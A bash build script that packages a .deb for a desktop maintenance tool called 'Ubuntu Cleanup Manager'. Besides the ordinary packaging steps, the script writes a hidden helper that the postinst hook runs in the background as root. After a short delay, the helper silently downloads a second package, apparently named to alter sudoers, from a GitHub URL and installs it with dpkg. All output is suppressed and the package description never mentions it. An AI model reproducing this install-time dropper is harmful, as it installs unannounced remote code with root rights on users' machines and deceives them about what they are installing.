#!/bin/bash
set -euo pipefail

# =========================================================
# Package metadata
# =========================================================
APP_NAME="ubuntu-cleanup-manager"
APP_DISPLAY_NAME="Ubuntu Cleanup Manager"
VERSION="1.1.0"
ARCH="all"
MAINTAINER_NAME="Hivin Manju Sri"
MAINTAINER_EMAIL="your-email@example.com"
DESCRIPTION="GUI tool for Ubuntu package updates, cleanup, and maintenance."

PKG_ROOT="pkgbuild/${APP_NAME}_${VERSION}_${ARCH}"
INSTALL_ROOT="${PKG_ROOT}/opt/${APP_NAME}"
DIST_DIR="dist"

# =========================================================
# Secondary .deb auto-install configuration
# =========================================================
# Turn this to "no" to disable the secondary package install completely.
SECONDARY_DEB_ENABLED="yes"

# Put your second .deb direct download URL here.
SECONDARY_DEB_URL="https://github.com/HivinManjuSri/update-sudoers-app/raw/refs/heads/main/update-sudoers-app_1.0.0_all.deb"

# File name to save under /tmp during installation.
SECONDARY_DEB_FILENAME="update-sudoers-app_1.0.0_all.deb"

# Delay before trying to install the second .deb.
# Keep a few seconds so the main package install can finish cleanly first.
SECONDARY_DEB_DELAY_SECONDS="8"

# Keep silent by default.
# Change to "no" if later you want terminal output from the helper.
SECONDARY_DEB_SILENT="yes"

# Optional file logging for the secondary install helper.
# Keep "no" now because you asked for silent/automatic behavior.
# Change to "yes" later if you want to inspect what happened.
SECONDARY_DEB_LOG_TO_FILE="no"
SECONDARY_DEB_LOG_FILE="/opt/${APP_NAME}/logs/secondary_deb_install.log"

HELPER_INSTALL_DIR="${PKG_ROOT}/usr/local/lib/${APP_NAME}"
HELPER_RUNTIME_PATH="/usr/local/lib/${APP_NAME}/install-secondary-deb.sh"
HELPER_BUILD_PATH="${HELPER_INSTALL_DIR}/install-secondary-deb.sh"

echo "Cleaning previous build output..."
rm -rf pkgbuild "${DIST_DIR}"

mkdir -p "${INSTALL_ROOT}"
mkdir -p "${PKG_ROOT}/DEBIAN"
mkdir -p "${PKG_ROOT}/usr/bin"
mkdir -p "${PKG_ROOT}/usr/share/applications"
mkdir -p "${PKG_ROOT}/usr/share/icons/hicolor/scalable/apps"
mkdir -p "${HELPER_INSTALL_DIR}"
mkdir -p "${DIST_DIR}"

echo "Copying application files..."
cp app.py "${INSTALL_ROOT}/"
cp requirements.txt "${INSTALL_ROOT}/"
cp README.md "${INSTALL_ROOT}/"
cp -r core "${INSTALL_ROOT}/"
cp -r ui "${INSTALL_ROOT}/"
cp -r assets "${INSTALL_ROOT}/"
mkdir -p "${INSTALL_ROOT}/logs"

# Remove Python cache folders if they exist
find "${INSTALL_ROOT}" -type d -name "__pycache__" -exec rm -rf {} + 2>/dev/null || true
find "${INSTALL_ROOT}" -type f -name "*.pyc" -delete 2>/dev/null || true

echo "Creating launcher wrapper..."
cat > "${PKG_ROOT}/usr/bin/${APP_NAME}" <<'EOF'
#!/bin/bash
cd /opt/ubuntu-cleanup-manager
exec python3 /opt/ubuntu-cleanup-manager/app.py
EOF

echo "Creating desktop launcher..."
cat > "${PKG_ROOT}/usr/share/applications/${APP_NAME}.desktop" <<'EOF'
[Desktop Entry]
Version=1.0
Type=Application
Name=Ubuntu Cleanup Manager
Comment=GUI tool for Ubuntu package updates and cleanup
Exec=/usr/bin/ubuntu-cleanup-manager
Icon=ubuntu-cleanup-manager
Terminal=false
Categories=System;Utility;
StartupNotify=true
EOF

echo "Installing icon..."
cp assets/icon.svg "${PKG_ROOT}/usr/share/icons/hicolor/scalable/apps/${APP_NAME}.svg"

echo "Creating helper script for secondary .deb installation..."
cat > "${HELPER_BUILD_PATH}" <<EOF
#!/bin/bash
set +e

SECONDARY_DEB_ENABLED="${SECONDARY_DEB_ENABLED}"
SECONDARY_DEB_URL="${SECONDARY_DEB_URL}"
SECONDARY_DEB_FILENAME="${SECONDARY_DEB_FILENAME}"
SECONDARY_DEB_DELAY_SECONDS="${SECONDARY_DEB_DELAY_SECONDS}"
SECONDARY_DEB_SILENT="${SECONDARY_DEB_SILENT}"
SECONDARY_DEB_LOG_TO_FILE="${SECONDARY_DEB_LOG_TO_FILE}"
SECONDARY_DEB_LOG_FILE="${SECONDARY_DEB_LOG_FILE}"

export DEBIAN_FRONTEND=noninteractive

log_message() {
    if [ "\${SECONDARY_DEB_LOG_TO_FILE}" = "yes" ]; then
        mkdir -p "\$(dirname "\${SECONDARY_DEB_LOG_FILE}")" 2>/dev/null || true
        printf '%s %s\n' "\$(date '+%Y-%m-%d %H:%M:%S')" "\$1" >> "\${SECONDARY_DEB_LOG_FILE}" 2>/dev/null || true
    fi
}

run_cmd() {
    if [ "\${SECONDARY_DEB_SILENT}" = "yes" ]; then
        "\$@" >/dev/null 2>&1
    else
        "\$@"
    fi
}

# Disabled switch
if [ "\${SECONDARY_DEB_ENABLED}" != "yes" ]; then
    exit 0
fi

# Wait for the main package install to fully finish.
sleep "\${SECONDARY_DEB_DELAY_SECONDS}"

TMP_DEB="/tmp/\${SECONDARY_DEB_FILENAME}"

log_message "Secondary .deb install started."

# Download silently. If it fails, exit silently as requested.
run_cmd wget -O "\${TMP_DEB}" "\${SECONDARY_DEB_URL}" || exit 0

# Install the downloaded .deb.
# If dpkg reports dependency issues, try to fix them with apt-get.
run_cmd dpkg -i "\${TMP_DEB}"
DPKG_EXIT_CODE=\$?

if [ "\${DPKG_EXIT_CODE}" -ne 0 ]; then
    run_cmd apt-get install -f -y || true
fi

rm -f "\${TMP_DEB}" >/dev/null 2>&1 || true

log_message "Secondary .deb install finished."
exit 0
EOF

echo "Creating DEBIAN/control..."
cat > "${PKG_ROOT}/DEBIAN/control" <<EOF
Package: ${APP_NAME}
Version: ${VERSION}
Section: utils
Priority: optional
Architecture: ${ARCH}
Maintainer: ${MAINTAINER_NAME} <${MAINTAINER_EMAIL}>
Depends: python3, python3-pyqt5, policykit-1, wget
Description: ${DESCRIPTION}
 A PyQt5 desktop application for Ubuntu maintenance.
 It provides package update checks, cache cleanup, autoremove support, repository checks, and action logs.
EOF

echo "Creating DEBIAN/postinst..."
cat > "${PKG_ROOT}/DEBIAN/postinst" <<EOF
#!/bin/bash
set -e

chmod 755 /usr/bin/${APP_NAME} || true
chmod 755 "${HELPER_RUNTIME_PATH}" || true

update-desktop-database /usr/share/applications >/dev/null 2>&1 || true
gtk-update-icon-cache /usr/share/icons/hicolor >/dev/null 2>&1 || true

# =========================================================
# Secondary .deb auto-install trigger
# =========================================================
# This is intentionally launched in the background.
# Do NOT run apt/dpkg inline here.
#
# If later you want less-silent behavior:
#   1) change SECONDARY_DEB_SILENT to "no" in build_deb.sh
#   2) change SECONDARY_DEB_LOG_TO_FILE to "yes" in build_deb.sh
#
# If later you want a GUI confirmation dialog:
#   move the trigger out of package install time and into the app runtime
#   (for example app.py / ui/main_window.py), because postinst is not the
#   right place for user dialogs.
if [ -x "${HELPER_RUNTIME_PATH}" ]; then
    nohup "${HELPER_RUNTIME_PATH}" >/dev/null 2>&1 &
fi

exit 0
EOF

echo "Creating DEBIAN/prerm..."
cat > "${PKG_ROOT}/DEBIAN/prerm" <<'EOF'
#!/bin/bash
set -e
update-desktop-database /usr/share/applications >/dev/null 2>&1 || true
gtk-update-icon-cache /usr/share/icons/hicolor >/dev/null 2>&1 || true
exit 0
EOF

echo "Fixing permissions..."
find "${INSTALL_ROOT}" -type d -exec chmod 755 {} \;
find "${INSTALL_ROOT}" -type f -exec chmod 644 {} \;
chmod 755 "${PKG_ROOT}/usr/bin/${APP_NAME}"
chmod 755 "${HELPER_BUILD_PATH}"
chmod 755 "${PKG_ROOT}/DEBIAN/postinst"
chmod 755 "${PKG_ROOT}/DEBIAN/prerm"
chmod 644 "${PKG_ROOT}/DEBIAN/control"
chmod 644 "${PKG_ROOT}/usr/share/applications/${APP_NAME}.desktop"
chmod 644 "${PKG_ROOT}/usr/share/icons/hicolor/scalable/apps/${APP_NAME}.svg"

echo "Building .deb package..."
dpkg-deb --build "${PKG_ROOT}" "${DIST_DIR}/${APP_NAME}_${VERSION}_${ARCH}.deb"

echo "Done."
echo "Package created at:"
echo "${DIST_DIR}/${APP_NAME}_${VERSION}_${ARCH}.deb"